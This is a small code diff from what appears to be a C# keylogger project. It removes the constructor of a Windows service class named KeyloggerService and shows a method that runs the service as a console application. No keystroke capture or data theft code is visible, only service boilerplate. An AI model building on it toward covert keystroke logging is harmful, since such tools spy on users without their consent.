@@ -8,11 +8,6 @@ namespace Keylogger
 {
     public partial class KeyloggerService : ServiceBase
     {
-        public KeyloggerService()
-        {
-            InitializeComponent();
-        }
-
         public void ExecuteAsConsoleApplication(string[] args)
         {
             this.OnStart(args);
